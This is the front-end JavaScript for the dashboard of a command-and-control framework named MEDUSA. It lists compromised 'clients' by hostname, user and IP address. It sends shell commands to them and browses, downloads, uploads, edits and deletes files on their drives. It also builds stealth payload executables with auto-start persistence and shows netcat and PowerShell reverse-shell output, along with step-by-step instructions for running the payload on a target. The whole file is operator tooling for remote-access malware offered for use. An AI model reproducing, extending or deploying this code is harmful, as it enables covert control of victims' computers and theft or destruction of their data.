/* MEDUSA C2 Framework - Dashboard JavaScript */

// Global variables
let socket;
let socketConnected = false;
let selectedClientId = null;
let selectedFileClientId = null;
let currentPath = 'C:\\';
let selectedFile = null;
let clients = {};
let globalSelectedClient = null; // Global client selection

$(document).ready(function() {
    // Initialize socket with error handling and proper configuration
    try {
        // Use Socket.IO v4 compatible configuration
        socket = io({
            transports: ['websocket', 'polling'],
            timeout: 5000,
            forceNew: true,
            autoConnect: true,
            reconnection: true,
            reconnectionAttempts: 3,
            reconnectionDelay: 1000
        });
        console.log('Socket initialized with compatibility settings');
        initializeSocket();
    } catch (e) {
        console.error('Socket initialization failed:', e);
        // Set a flag to indicate socket is not available
        socketConnected = false;
        console.log('Continuing in HTTP-only mode');
    }
    loadDashboard();
    
    // Debug: Log that DOM is ready
    console.log('DOM ready, initializing event handlers');
    
    $('.nav-link').click(function(e) {
        e.preventDefault();
        console.log('Navigation clicked:', $(this).data('page'));
        const page = $(this).data('page');
        showPage(page);
    });
    
    $('#command-input').keypress(function(e) {
        if (e.which === 13) executeCommand();
    });
    
    // Client selection change events
    $('#client-select').change(function() {
        selectedClientId = $(this).val();
        globalSelectedClient = selectedClientId;
        if (selectedClientId) {
            $('#command-input, #execute-btn').prop('disabled', false);
        } else {
            $('#command-input, #execute-btn').prop('disabled', true);
        }
    });
    
    // File explorer events
    $('#file-client-select').change(function() {
        const clientId = $(this).val();
        if (clientId) {
            selectedFileClientId = clientId;
            globalSelectedClient = clientId;
            browsePath('C:\\');
        }
    });
    
    // Payload type change
    $('#payload-type').change(function() {
        if ($(this).val() === 'python') {
            $('#python-options').show();
        } else {
            $('#python-options').hide();
        }
    });
});

function initializeSocket() {
    // Connection status handlers
    socket.on('connect', function() {
        console.log('Socket connected successfully - real-time features enabled');
        socketConnected = true;
    });
    
    socket.on('disconnect', function() {
        console.log('Socket disconnected - switching to HTTP mode');
        socketConnected = false;
    });
    
    socket.on('connect_error', function(error) {
        console.log('Socket connection failed - using HTTP fallback');
        socketConnected = false;
        // Don't show annoying notifications for connection errors
    });
    socket.on('client_connected', function(data) {
        clients[data.id] = data;
        updateClients();
        addTerminalMessage(`Client connected: ${data.hostname}`);
        
        // Show notification
        showNotification('🔗 Client Connected', `${data.hostname} (${data.username}) from ${data.ip_address}`, 'success');
    });
    
    socket.on('client_disconnected', function(data) {
        delete clients[data.id];
        updateClients();
        
        // Show notification
        showNotification('🔌 Client Disconnected', `Client ${data.id.substring(0, 8)}... has disconnected`, 'warning');
    });
    
    socket.on('task_updated', function(data) {
        console.log('Task updated:', data);
        
        if (data.client_id === selectedClientId) {
            // Display command output
            if (data.output && data.output.trim()) {
                addTerminalMessage(data.output);
            }
            // Display error if any
            if (data.error && data.error.trim()) {
                addTerminalMessage(`Error: ${data.error}`);
            }
        }
        
        // Handle file explorer output
        if (data.client_id === selectedFileClientId && data.output) {
            console.log('File explorer output for command:', data.command);
            console.log('Output:', data.output);
            handleFileExplorerOutput(data.output, data.command);
        }
    });
    
    // Handle file content response
    socket.on('file_content', function(data) {
        if (data.client_id === selectedFileClientId) {
            $('#file-content').val(data.content);
            $('#editModal').modal('show');
        }
    });
    
    // Handle download events
    socket.on('download_requested', function(data) {
        console.log('Download requested:', data);
        showNotification('📎 Download Request Sent', `Download request sent for: ${data.file_path}`, 'success');
    });
    
    // Handle file download completion (when client sends file data)
    socket.on('file_received', function(data) {
        if (data.client_id === selectedFileClientId) {
            console.log('File received:', data);
            showNotification('✅ Download Complete', `File downloaded: ${data.filename}`, 'success');
        }
    });
    
    // Handle upload events
    socket.on('file_uploaded', function(data) {
        if (data.client_id === selectedFileClientId) {
            console.log('File uploaded:', data);
            showNotification('✅ Upload Complete', `File uploaded: ${data.file_path}`, 'success');
            setTimeout(() => refreshFiles(), 1000);
        }
    });
    
    // Handle general errors
    socket.on('error', function(data) {
        console.error('Socket error:', data);
        showNotification('❌ Error', data.message || 'An error occurred', 'error');
    });
    
    // Listener event handlers
    socket.on('listener_created', function(data) {
        showNotification('✅ Listener Created', `Listener '${data.name}' created on ${data.host}:${data.port}`, 'success');
        loadListeners();
    });
    
    socket.on('listener_started', function(data) {
        showNotification('▶️ Listener Started', `Listener '${data.name}' is now running`, 'success');
        loadListeners();
    });
    
    socket.on('listener_stopped', function(data) {
        showNotification('⏹️ Listener Stopped', `Listener '${data.name}' has been stopped`, 'warning');
        loadListeners();
    });
    
    socket.on('listener_deleted', function(data) {
        showNotification('🗑️ Listener Deleted', `Listener '${data.name}' has been deleted`, 'info');
        loadListeners();
    });
    
    socket.on('listener_error', function(data) {
        showNotification('❌ Listener Error', data.message, 'error');
    });
}

function showPage(page) {
    console.log('Switching to page:', page);
    $('.page-section').removeClass('active');
    $(`#${page}`).addClass('active');
    $('.nav-link').removeClass('active');
    $(`.nav-link[data-page="${page}"]`).addClass('active');
    
    // Auto-select global client when switching pages
    if (globalSelectedClient && clients[globalSelectedClient]) {
        if (page === 'terminal') {
            selectedClientId = globalSelectedClient;
            $('#client-select').val(globalSelectedClient);
            $('#command-input, #execute-btn').prop('disabled', false);
        } else if (page === 'filemanager') {
            selectedFileClientId = globalSelectedClient;
            $('#file-client-select').val(globalSelectedClient);
            browsePath('C:\\');
        }
    }
    
    if (page === 'clients') loadClients();
    if (page === 'listeners') loadListeners();
}

function loadDashboard() {
    // Load dashboard data
    fetch('/api/clients')
        .then(response => response.json())
        .then(data => {
            clients = {};
            data.forEach(client => {
                clients[client.id] = client;
            });
            updateClients();
        });
}

function updateClients() {
    const clientSelect = $('#client-select');
    const fileClientSelect = $('#file-client-select');
    const clientsList = $('#clients-list');
    const clientCount = $('#client-count');
    
    // Update client count
    clientCount.text(Object.keys(clients).length);
    
    // Update dropdowns
    clientSelect.empty().append('<option value="">Select Client</option>');
    fileClientSelect.empty().append('<option value="">Select Client</option>');
    
    // Update clients list
    clientsList.empty();
    
    Object.values(clients).forEach(client => {
        const option = `<option value="${client.id}">${client.hostname} (${client.username})</option>`;
        clientSelect.append(option);
        fileClientSelect.append(option);
        
        // Add to clients list
        const clientRow = `
            <tr>
                <td>${client.id.substring(0, 8)}...</td>
                <td>${client.hostname}</td>
                <td>${client.username}</td>
                <td>${client.ip_address}</td>
                <td>${client.os}</td>
                <td>
                    <button class="btn btn-sm btn-primary" onclick="selectGlobalClient('${client.id}')">
                        <i class="fas fa-mouse-pointer"></i> Select
                    </button>
                </td>
            </tr>
        `;
        clientsList.append(clientRow);
    });
    
    // Restore global selection if still valid
    if (globalSelectedClient && clients[globalSelectedClient]) {
        clientSelect.val(globalSelectedClient);
        fileClientSelect.val(globalSelectedClient);
    }
}

function selectGlobalClient(clientId) {
    globalSelectedClient = clientId;
    updateClients();
    showNotification('✅ Client Selected', `Client ${clients[clientId].hostname} selected globally`, 'success');
}

function loadClients() {
    fetch('/api/clients')
        .then(response => response.json())
        .then(data => {
            clients = {};
            data.forEach(client => {
                clients[client.id] = client;
            });
            updateClients();
        });
}

function executeCommand() {
    const command = $('#command-input').val().trim();
    if (!command || !selectedClientId) return;
    
    addTerminalMessage(`<span style="color: #ff79c6;">medusac2$></span> ${command}`);
    
    if (!socket || !socketConnected) {
        // Fallback to HTTP API if socket not available
        fetch('/api/execute', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                client_id: selectedClientId,
                command: command
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                addTerminalMessage('Command sent successfully (check for output updates)');
            } else {
                addTerminalMessage(`Error: ${data.error || 'Failed to send command'}`);
            }
        })
        .catch(error => {
            console.error('Error executing command:', error);
            addTerminalMessage('Error: Failed to send command');
        });
    } else {
        socket.emit('execute_command', {
            client_id: selectedClientId,
            command: command
        });
    }
    
    $('#command-input').val('');
}

function addTerminalMessage(message) {
    const terminal = $('#terminal-output');
    
    // Check if message contains HTML (for colored output)
    if (message.includes('<span')) {
        terminal.append(`<div>${message}</div>`);
    } else {
        // For regular command output, use <pre> to preserve exact formatting
        const preElement = $('<pre>').css({
            'margin': '0 0 5px 0',
            'padding': '0',
            'font-family': 'inherit',
            'color': 'inherit',
            'background': 'transparent',
            'border': 'none',
            'white-space': 'pre-wrap',
            'word-wrap': 'break-word',
            'overflow-wrap': 'break-word'
        }).text(message);
        
        terminal.append(preElement);
    }
    
    // Auto-scroll to bottom
    terminal.scrollTop(terminal[0].scrollHeight);
    
    // If this was a directory change, update the prompt
    if (message.includes('Directory changed to:')) {
        // Add a visual indicator of directory change
        const pathMatch = message.match(/Directory changed to: (.+)/);
        if (pathMatch) {
            const newPath = pathMatch[1];
            terminal.append(`<div style="color: var(--dracula-purple); font-weight: bold; margin: 5px 0;">Current directory: ${newPath}</div>`);
            terminal.scrollTop(terminal[0].scrollHeight);
        }
    }
}

// Notification System
function showNotification(title, message, type = 'success') {
    const notification = $(`
        <div class="notification ${type}">
            <div class="notification-title">${title}</div>
            <div class="notification-message">${message}</div>
        </div>
    `);
    
    $('body').append(notification);
    
    // Show notification
    setTimeout(() => {
        notification.addClass('show');
    }, 100);
    
    // Auto hide after 4 seconds
    setTimeout(() => {
        notification.removeClass('show');
        setTimeout(() => {
            notification.remove();
        }, 300);
    }, 4000);
}

// File Explorer Functions
function browsePath(path) {
    if (!selectedFileClientId) {
        alert('Please select a client first');
        return;
    }
    
    // Normalize the path - remove excessive backslashes
    path = path.replace(/\\{3,}/g, '\\\\').replace(/\\{2}$/, '\\');
    
    currentPath = path;
    $('#current-path').text(path);
    
    console.log('Browsing path:', path);
    
    // Send simple dir command - Windows specific for now
    const listCommand = 'dir /b "' + path + '"';
    
    socket.emit('execute_command', {
        client_id: selectedFileClientId,
        command: listCommand
    });
}

function listAllDrives() {
    if (!selectedFileClientId) {
        alert('Please select a client first');
        return;
    }
    
    currentPath = 'Drives';
    $('#current-path').text('All Drives');
    
    // Use PowerShell instead of deprecated wmic for better Windows 11 compatibility
    const driveCommand = 'powershell "Get-WmiObject -Class Win32_LogicalDisk | Select-Object DeviceID, Size, FreeSpace | Format-Table -AutoSize"';
    
    socket.emit('execute_command', {
        client_id: selectedFileClientId,
        command: driveCommand
    });
}

function handleFileExplorerOutput(output, command) {
    if (command && (command.includes('wmic logicaldisk') || command.includes('Get-WmiObject -Class Win32_LogicalDisk'))) {
        displayDrives(output);
    } else if (command && command.includes('dir /b')) {
        displayDirectoryListing(output, currentPath);
    }
}

// Enhanced displayDrives function to handle both wmic and PowerShell output
function displayDrives(output) {
    const explorer = $('#file-explorer');
    explorer.empty();
    
    explorer.append('<div class="p-2 border-bottom bg-secondary"><h6 class="mb-0"><i class="fas fa-server me-2"></i>Available Drives</h6></div>');
    
    // Check if it's PowerShell output (contains DeviceID, Size, FreeSpace headers)
    if (output.includes('DeviceID') && output.includes('Size') && output.includes('FreeSpace')) {
        // Parse PowerShell output
        const lines = output.split('\n').filter(line => {
            const trimmed = line.trim();
            return trimmed && 
                   !trimmed.includes('DeviceID') && 
                   !trimmed.includes('--------') && 
                   trimmed.includes(':');
        });
        
        lines.forEach(line => {
            const parts = line.trim().split(/\s+/);
            if (parts.length >= 3) {
                const deviceId = parts[0]; // C:, D:, etc.
                const totalSize = parts[1] ? formatBytes(parseInt(parts[1])) : 'Unknown';
                const freeSpace = parts[2] ? formatBytes(parseInt(parts[2])) : 'Unknown';
                
                if (deviceId && deviceId.includes(':')) {
                    createDriveElement(deviceId, freeSpace, totalSize, explorer);
                }
            }
        });
    } else {
        // Parse legacy wmic output
        const lines = output.split('\n').filter(line => line.trim() && !line.includes('Caption') && !line.includes('---'));
        
        lines.forEach(line => {
            const parts = line.trim().split(/\s+/);
            if (parts.length >= 3) {
                const caption = parts[0]; // C:, D:, etc.
                const freeSpace = parts[1] ? formatBytes(parseInt(parts[1])) : 'Unknown';
                const totalSize = parts[2] ? formatBytes(parseInt(parts[2])) : 'Unknown';
                
                if (caption && caption.includes(':')) {
                    createDriveElement(caption, freeSpace, totalSize, explorer);
                }
            }
        });
    }
}

// Helper function to create drive elements consistently
function createDriveElement(driveId, freeSpace, totalSize, explorer) {
    const driveDiv = $('<div>').addClass('file-item p-3 border-bottom').css('cursor', 'pointer');
    driveDiv.on('click', function() {
        // Ensure consistent drive path format
        const drivePath = driveId.endsWith(':') ? driveId + '\\\\' : driveId;
        browsePath(drivePath);
    });
    
    const driveContent = $('<div class="d-flex align-items-center">').append(
        $('<i class="fas fa-hdd text-primary me-3" style="font-size: 24px;"></i>'),
        $('<div>').append(
            $('<h6 class="mb-1">').text(driveId + ' Drive'),
            $('<small class="text-muted">').text('Free: ' + freeSpace + ' | Total: ' + totalSize)
        )
    );
    
    driveDiv.append(driveContent);
    explorer.append(driveDiv);
}

// Display directory listing
function displayDirectoryListing(output, path) {
    const explorer = $('#file-explorer');
    explorer.empty();
    
    // Add parent directory link if not at root
    if (path !== 'C:\\' && path !== 'D:\\' && path !== 'E:\\' && !path.endsWith(':\\')) {
        // Fix parent path calculation - handle trailing backslashes properly
        let cleanPath = path.replace(/\\+$/, ''); // Remove trailing backslashes
        let parentPath;
        
        if (cleanPath.includes('\\')) {
            // Split and rejoin without last directory
            const pathParts = cleanPath.split('\\');
            pathParts.pop(); // Remove last directory
            parentPath = pathParts.join('\\');
            
            // Ensure drive root has trailing backslash
            if (parentPath.match(/^[A-Z]:$/)) {
                parentPath += '\\';
            } else if (parentPath && !parentPath.endsWith('\\')) {
                parentPath += '\\';
            }
        } else {
            // If no backslash, we're probably at drive root
            parentPath = 'Drives'; // Go back to drives list
        }
        
        console.log('Current path:', path, 'Parent path:', parentPath);
        
        const parentDiv = $('<div class="file-item p-2 border-bottom">').css('cursor', 'pointer');
        parentDiv.on('click', function() {
            if (parentPath === 'Drives') {
                listAllDrives();
            } else {
                browsePath(parentPath);
            }
        });
        parentDiv.html('<i class="fas fa-level-up-alt text-info me-2"></i><span>.. (Parent Directory)</span>');
        explorer.append(parentDiv);
    }
    
    const files = output.split('\n').filter(line => line.trim());
    
    files.forEach(fileName => {
        fileName = fileName.trim();
        if (fileName && fileName !== '.' && fileName !== '..') {
            const isDirectory = !fileName.includes('.') || fileName.endsWith('.lnk');
            const icon = isDirectory ? 'fas fa-folder text-warning' : 'fas fa-file text-light';
            
            const fileDiv = $('<div class="file-item p-2 border-bottom">').css('cursor', 'pointer');
            
            if (isDirectory) {
                fileDiv.on('click', function() {
                    // Ensure proper path concatenation
                    const newPath = path.endsWith('\\') ? path + fileName + '\\\\' : path + '\\\\' + fileName + '\\\\';
                    browsePath(newPath);
                });
            } else {
                fileDiv.on('click', function() {
                    console.log('File clicked:', fileName);
                    selectFile(fileName, false);
                });
            }
            
            fileDiv.html('<i class="' + icon + ' me-2"></i><span>' + fileName + '</span>');
            
            // Add visual indicator for file vs directory
            if (!isDirectory) {
                fileDiv.attr('title', 'Click to select file for download/edit');
                fileDiv.css('border-left', '3px solid var(--dracula-green)');
            } else {
                fileDiv.attr('title', 'Click to open directory');
                fileDiv.css('border-left', '3px solid var(--dracula-purple)');
            }
            
            explorer.append(fileDiv);
        }
    });
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 B';
    const k = 1024;
    const sizes = ['B', 'KB', 'MB', 'GB', 'TB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function selectFile(fileName, isDirectory) {
    console.log('Selecting file:', fileName, 'isDirectory:', isDirectory);
    selectedFile = fileName;
    $('.file-item').removeClass('selected');
    
    // Better file selection logic - look for exact match
    $('.file-item').each(function() {
        const itemText = $(this).find('span').last().text().trim();
        if (itemText === fileName) {
            $(this).addClass('selected').css('background-color', 'rgba(189, 147, 249, 0.4)');
            console.log('Selected file item:', itemText);
        }
    });
    
    // Show notification of selection
    showNotification('📁 File Selected', `Selected: ${fileName}`, 'success');
    
    // Update the current path display to show selected file
    $('#current-path').html(`${currentPath} <span style="color: var(--dracula-pink); font-weight: bold;">[${fileName}]</span>`);
}

function refreshFiles() {
    if (currentPath === 'Drives') {
        listAllDrives();
    } else {
        browsePath(currentPath);
    }
}

function downloadFile() {
    if (!selectedFile || !selectedFileClientId) {
        alert('Please select a file first');
        return;
    }
    
    console.log('Download request for:', selectedFile, 'from client:', selectedFileClientId);
    
    const filePath = currentPath.endsWith('\\') ? currentPath + selectedFile : currentPath + '\\' + selectedFile;
    console.log('Full file path:', filePath);
    
    // Show loading notification
    showNotification('📎 Download Started', `Downloading: ${selectedFile}`, 'success');
    
    socket.emit('download_file', {
        client_id: selectedFileClientId,
        file_path: filePath
    });
}

function editFile() {
    if (!selectedFile || !selectedFileClientId) return;
    
    const filePath = currentPath.endsWith('\\') ? currentPath + selectedFile : currentPath + '\\' + selectedFile;
    socket.emit('get_file_content', {
        client_id: selectedFileClientId,
        file_path: filePath
    });
}

function deleteFile() {
    if (!selectedFile || !selectedFileClientId) return;
    
    if (!confirm('Are you sure you want to delete ' + selectedFile + '?')) return;
    
    const filePath = currentPath.endsWith('\\') ? currentPath + selectedFile : currentPath + '\\' + selectedFile;
    socket.emit('execute_command', {
        client_id: selectedFileClientId,
        command: 'del "' + filePath + '"'
    });
    
    setTimeout(() => refreshFiles(), 1000);
}

function showUploadModal() {
    if (!selectedFileClientId) {
        alert('Please select a client first');
        return;
    }
    $('#upload-path').val(currentPath);
    $('#uploadModal').modal('show');
}

function uploadFile() {
    const file = document.getElementById('upload-file').files[0];
    const path = $('#upload-path').val();
    
    if (!file || !path) {
        alert('Please select a file and specify upload path');
        return;
    }
    
    const reader = new FileReader();
    reader.onload = function(e) {
        socket.emit('upload_file', {
            client_id: selectedFileClientId,
            file_name: file.name,
            file_data: e.target.result.split(',')[1], // Remove data:type;base64, prefix
            upload_path: path
        });
    };
    reader.readAsDataURL(file);
    
    $('#uploadModal').modal('hide');
}

function createFolder() {
    if (!selectedFileClientId) {
        alert('Please select a client first');
        return;
    }
    
    const folderName = prompt('Enter folder name:');
    if (!folderName) return;
    
    const folderPath = currentPath.endsWith('\\') ? currentPath + folderName : currentPath + '\\' + folderName;
    
    socket.emit('execute_command', {
        client_id: selectedFileClientId,
        command: 'mkdir "' + folderPath + '"'
    });
    
    setTimeout(() => refreshFiles(), 1000);
}

function saveFile() {
    if (!selectedFile || !selectedFileClientId) return;
    
    const content = $('#file-content').val();
    const filePath = currentPath.endsWith('\\') ? currentPath + selectedFile : currentPath + '\\' + selectedFile;
    
    socket.emit('save_file', {
        client_id: selectedFileClientId,
        file_path: filePath,
        content: content
    });
    
    $('#editModal').modal('hide');
}

// Enhanced Payload Builder Functions
function generatePayload() {
    const type = $('#payload-type').val();
    const ip = $('#server-ip').val();
    const port = $('#server-port').val();
    const payloadMode = $('#payload-mode').val();
    const addPersistence = $('#add-persistence').is(':checked');
    let exeName = $('#exe-name').val() || 'client';
    
    // Strip .exe extension if user entered it
    if (exeName.toLowerCase().endsWith('.exe')) {
        exeName = exeName.slice(0, -4);
    }
    
    if (!ip || !port) {
        alert('Please enter server IP and port');
        return;
    }
    
    // Show loading
    $('#payload-output').text('Generating payload...');
    $('#copy-btn').prop('disabled', true);
    
    // Send generation request to server
    socket.emit('generate_payload', {
        type: type,
        ip: ip,
        port: parseInt(port),
        output: exeName,
        payload_mode: payloadMode,
        persistence: addPersistence,
        build_exe: type === 'python'
    });
}

// Handle payload generation response
socket.on('payload_generated', function(data) {
    if (data.success) {
        let output = '';
        
        switch(data.type) {
            case 'python':
                let modeText = '';
                if (data.mode === 'silent') {
                    modeText = ' (Silent Stealth Mode)';
                } else if (data.mode === 'stealth') {
                    modeText = ' (Advanced Stealth Mode)';
                } else if (data.mode === 'basic') {
                    modeText = ' (Basic Mode)';
                }
                
                output = '# MEDUSA C2 Payload Generated' + modeText + '\n\n';
                output += '🚀 Build Status: SUCCESS\n';
                output += '📅 Generated: ' + new Date().toLocaleString() + '\n\n';
                
                if (data.result.python_file) {
                    output += '📄 Python source: ' + data.result.python_file.replace(/\\/g, '/') + '\n';
                }
                if (data.result.exe_file) {
                    output += '🚀 Executable: ' + data.result.exe_file.replace(/\\/g, '/') + '\n';
                    
                    if (data.mode === 'silent' || data.mode === 'stealth') {
                        output += '\n✅ Silent EXE generated successfully!\n';
                        output += '🔇 Runs completely silently (no console window)\n';
                        if (data.mode === 'stealth') {
                            output += '🔒 Enhanced stealth features enabled\n';
                            output += '⚙️ Background priority management active\n';
                        }
                    } else {
                        output += '\n✅ Standard EXE generated successfully!\n';
                        output += '💻 Runs with normal console behavior\n';
                    }
                } else if (data.result.python_file) {
                    output += '\n⚠️  Python source only (EXE build failed)\n';
                }
                
                if (data.persistence) {
                    output += '🔄 Persistence enabled (auto-start)\n';
                }
                
                output += '\n📁 Files saved to nova/payloads/ directory\n';
                output += '📂 Build logs available in console\n';
                output += '🔗 Ready for deployment!\n\n';
                
                // Add deployment instructions
                output += '📋 Deployment Instructions:\n';
                output += '1. Copy the executable to target system\n';
                output += '2. Ensure C2 server is listening on specified port\n';
                output += '3. Execute the payload on target\n';
                output += '4. Monitor connections in Clients section\n';
                
                // Add option to open folder
                setTimeout(() => {
                    if (confirm('✅ Payload generated successfully!\n\nWould you like to open the payloads folder?')) {
                        // Send command to open folder
                        if (selectedClientId) {
                            socket.emit('execute_command', {
                                client_id: selectedClientId,
                                command: 'explorer "' + data.result.exe_file.replace(/\\/g, '\\').split('\\').slice(0, -1).join('\\') + '"'
                            });
                        }
                    }
                }, 500);
                
                break;
                
            case 'netcat':
                output = buildNetcatOutput(data.result.commands);
                break;
                
            case 'powershell':
                output = buildPowershellOutput(data.result.script);
                break;
        }
        
        $('#payload-output').text(output.replace(/\\n/g, '\n'));
        $('#copy-btn').prop('disabled', false);
    } else {
        $('#payload-output').text('❌ Error: ' + data.error + '\n\nPlease check:\n- PyInstaller is installed: pip install pyinstaller\n- Python is in PATH\n- Sufficient disk space available\n- Antivirus is not blocking the build process');
    }
});

function buildNetcatOutput(commands) {
    let output = '🐚 Netcat Reverse Shell Commands\n\n';
    output += '🪟 Windows:\n';
    commands.windows.forEach(cmd => {
        output += '   ' + cmd + '\n';
    });
    output += '\n🐧 Linux/Mac:\n';
    commands.linux.forEach(cmd => {
        output += '   ' + cmd + '\n';
    });
    output += '\n👂 Listener (run on server):\n';
    commands.listener.forEach(cmd => {
        output += '   ' + cmd + '\n';
    });
    return output;
}

function buildPowershellOutput(script) {
    let output = '⚡ PowerShell Reverse Shell\n\n';
    output += '📝 Full Script:\n';
    output += script.script + '\n\n';
    output += '🚀 One-liner:\n';
    output += script.oneliner + '\n\n';
    if (script.encoded) {
        output += '🔒 Encoded version:\n';
        output += script.encoded;
    }
    return output;
}

function copyToClipboard() {
    const output = $('#payload-output').text();
    navigator.clipboard.writeText(output).then(() => {
        alert('✅ Copied to clipboard!');
    }).catch(() => {
        alert('❌ Failed to copy to clipboard');
    });
}

// Listener Management Functions
function loadListeners() {
    fetch('/api/listeners')
        .then(response => response.json())
        .then(data => {
            updateListenersTable(data);
        })
        .catch(error => {
            console.error('Error loading listeners:', error);
        });
}

function updateListenersTable(listeners) {
    const listenersList = $('#listeners-list');
    listenersList.empty();
    
    listeners.forEach(listener => {
        const statusBadge = listener.running ? 
            '<span class="badge bg-success">Running</span>' :
            '<span class="badge bg-danger">Stopped</span>';
        
        const actionButton = listener.running ?
            `<button class="btn btn-sm btn-danger" onclick="stopListener('${listener.name}')">
                <i class="fas fa-stop"></i> Stop
            </button>` :
            `<button class="btn btn-sm btn-success" onclick="startListener('${listener.name}')">
                <i class="fas fa-play"></i> Start
            </button>`;
        
        const listenerRow = `
            <tr>
                <td>${listener.name}</td>
                <td>${listener.host}</td>
                <td>${listener.port}</td>
                <td>${statusBadge}</td>
                <td>${listener.clients_connected || 0}</td>
                <td>
                    ${actionButton}
                    <button class="btn btn-sm btn-warning ms-1" onclick="deleteListener('${listener.name}')">
                        <i class="fas fa-trash"></i> Delete
                    </button>
                </td>
            </tr>
        `;
        listenersList.append(listenerRow);
    });
}

function showCreateListenerModal() {
    $('#createListenerModal').modal('show');
}

function createListener() {
    const name = $('#listener-name').val().trim();
    const host = $('#listener-host').val().trim();
    const port = parseInt($('#listener-port').val());
    
    if (!name || !host || !port) {
        alert('Please fill in all fields');
        return;
    }
    
    console.log('Creating listener:', name, host, port);
    
    if (!socket || !socketConnected) {
        // Fallback to HTTP API if socket not available
        fetch('/api/listeners', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                name: name,
                host: host,
                port: port
            })
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showNotification('✅ Listener Created', `Listener '${name}' created on ${host}:${port}`, 'success');
                loadListeners();
                $('#createListenerModal').modal('hide');
                
                // Clear form
                $('#listener-name').val('');
                $('#listener-host').val('0.0.0.0');
                $('#listener-port').val('');
            } else {
                showNotification('❌ Error', data.error || 'Failed to create listener', 'error');
            }
        })
        .catch(error => {
            console.error('Error creating listener:', error);
            showNotification('❌ Error', 'Failed to create listener', 'error');
        });
    } else {
        socket.emit('create_listener', {
            name: name,
            host: host,
            port: port
        });
        
        $('#createListenerModal').modal('hide');
        
        // Clear form
        $('#listener-name').val('');
        $('#listener-host').val('0.0.0.0');
        $('#listener-port').val('');
    }
}

function startListener(name) {
    console.log('Starting listener:', name);
    if (!socket || !socketConnected) {
        // Fallback to HTTP API if socket not available
        fetch(`/api/listeners/${name}/start`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showNotification('▶️ Listener Started', `Listener '${name}' is now running`, 'success');
                loadListeners();
            } else {
                showNotification('❌ Error', data.error || 'Failed to start listener', 'error');
            }
        })
        .catch(error => {
            console.error('Error starting listener:', error);
            showNotification('❌ Error', 'Failed to start listener', 'error');
        });
    } else {
        socket.emit('start_listener', { name: name });
    }
}

function stopListener(name) {
    console.log('Stopping listener:', name);
    if (!socket || !socketConnected) {
        // Fallback to HTTP API if socket not available
        fetch(`/api/listeners/${name}/stop`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showNotification('⏹️ Listener Stopped', `Listener '${name}' has been stopped`, 'warning');
                loadListeners();
            } else {
                showNotification('❌ Error', data.error || 'Failed to stop listener', 'error');
            }
        })
        .catch(error => {
            console.error('Error stopping listener:', error);
            showNotification('❌ Error', 'Failed to stop listener', 'error');
        });
    } else {
        socket.emit('stop_listener', { name: name });
    }
}

function deleteListener(name) {
    if (!confirm(`Are you sure you want to delete listener '${name}'?`)) {
        return;
    }
    
    console.log('Deleting listener:', name);
    if (!socket || !socketConnected) {
        // Fallback to HTTP API if socket not available
        fetch(`/api/listeners/${name}`, {
            method: 'DELETE',
            headers: {
                'Content-Type': 'application/json'
            }
        })
        .then(response => response.json())
        .then(data => {
            if (data.success) {
                showNotification('🗑️ Listener Deleted', `Listener '${name}' has been deleted`, 'info');
                loadListeners();
            } else {
                showNotification('❌ Error', data.error || 'Failed to delete listener', 'error');
            }
        })
        .catch(error => {
            console.error('Error deleting listener:', error);
            showNotification('❌ Error', 'Failed to delete listener', 'error');
        });
    } else {
        socket.emit('delete_listener', { name: name });
    }
}